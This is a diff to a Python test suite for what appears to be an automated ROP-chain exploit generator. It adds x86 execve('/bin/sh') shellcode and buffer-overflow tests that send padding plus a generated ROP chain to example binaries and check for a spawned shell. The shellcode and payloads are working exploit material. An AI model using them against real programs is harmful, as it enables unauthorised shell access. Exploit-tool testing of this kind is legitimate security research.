@@ -23,6 +23,21 @@ class BofTests(unittest.TestCase):
      +  "\x0f\x05"                                      # syscall
     )
 
+  def shellcode_x86(self):
+    return ( # http://shell-storm.org/shellcode/files/shellcode-827.php
+        "\x31\xc0"              # xor    eax,eax
+     +  "\x50"                  # push   eax
+     +  "\x68\x2f\x2f\x73\x68"  # push   0x68732f2f
+     +  "\x68\x2f\x62\x69\x6e"  # push   0x6e69622f
+     +  "\x89\xe3"              # mov    ebx,esp
+     +  "\x50"                  # push   eax
+     +  "\x53"                  # push   ebx
+     +  "\x89\xe1"              # mov    ecx,esp
+     +  "\x31\xd2"              # xor    edx,edx
+     +  "\xb0\x0b"              # mov    al,0xb
+     +  "\xcd\x80"              # int    0x80
+    )
+
   def check_shell(self, p):
     input_str = self.random_string()
     p.writeline('echo ' + input_str)
@@ -135,14 +150,30 @@ class BofTests(unittest.TestCase):
     self.check_shell(p)
 
   def test_bof_read_got(self):
-    filename = '../example/bof_read_got'
+    self.do_test_bof_read_got('../example/bof_read_got')
+
+  def test_bof_read_got2(self):
+    self.do_test_bof_read_got('../example/bof_read_got2')
+
+  def do_test_bof_read_got(self, filename):
     p = process([filename,'3000'])
 
     files = [(filename, None, 0)]
-    libs = ["/lib/x86_64-linux-gnu/libc.so.6"]
-    rop = ropme.rop(files, libs, [["shellcode_hex", binascii.hexlify(self.shellcode_amd64())]], log_level = logging.DEBUG)
+    rop = ropme.rop(files, ["/lib/x86_64-linux-gnu/libc.so.6"], [["shellcode_hex", binascii.hexlify(self.shellcode_amd64())]], log_level = logging.DEBUG)
 
-    payload = 'A'*512 + 'B'*8 + rop
+    payload = 'A'*512 + ('B'*8) + rop
+    p.writeline(payload)
+    p.readline()
+    self.check_shell(p)
+
+  def test_bof_read_got_x86(self):
+    filename = '../example/bof_read_got_x86'
+    p = process([filename,'3000'])
+
+    files = [(filename, None, 0)]
+    rop = ropme.rop(files, ["/lib/i386-linux-gnu/libc.so.6"], [["shellcode_hex", binascii.hexlify(self.shellcode_x86())]], arch = archinfo.ArchX86(), log_level = logging.DEBUG)
+
+    payload = 'A'*512 + ('B'*16) + rop
     p.writeline(payload)
     p.readline()
     self.check_shell(p)
